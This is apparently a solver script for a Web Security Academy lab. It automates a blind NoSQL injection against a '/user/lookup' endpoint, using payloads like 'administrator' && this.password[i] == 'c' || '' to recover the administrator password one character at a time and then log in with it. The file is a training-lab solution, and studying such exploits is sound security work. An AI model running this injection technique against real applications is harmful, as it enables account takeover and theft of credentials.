from web_security_academy.core.logger import logger, NoNewline
from urllib.parse import urlencode

import string


def solve_lab(session):
    session.login("wiener", "peter")

    logger.info(
        'Determining the length of the administrator password by visiting "/user/lookup" with the following parameters:'
    )
    logger.info(
        '{"user": "administrator\' && this.password.length == \033[1;93m?\033[00m || \'"}'
    )

    len_pass = 1
    with NoNewline():
        while True:
            params = {"user": f"administrator' && this.password.length == {len_pass} || '"}
            resp = session.get_path("/user/lookup", params=params)
            json = resp.json()
            if "username" not in json:
                logger.info(f"{len_pass} => {json}")
                len_pass += 1
            else:
                logger.success(f"{len_pass} => {json}")
                break

    logger.info(
        'Determining administrator password by visiting "/user/lookup" with the following parameters:'
    )
    logger.info(
        '{"user": "administrator\' && this.password[\033[1;93m?\033[00m] == \033[1;93m?\033[00m || \'"}'
    )
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""

    with NoNewline():
        for i in range(len_pass):
            for c in alphabet:
                params = {"user": f"administrator' && this.password[{i}] == '{c}' || '"}
                resp = session.get_path("/user/lookup", params=params)

                json = resp.json()
                if "username" not in json:
                    logger.info(f"Progress: {password}... | {i}, '{c}' => {json}")
                else:
                    logger.success(f"Progress: {password}... | {i}, '{c}' => {json}")
                    password += c
                    break
            else:
                logger.fail(f"Unable to determine character at index {i}")
                return

    logger.success(f"Successfully extracted administrator password: {password}")
    session.login("administrator", password)
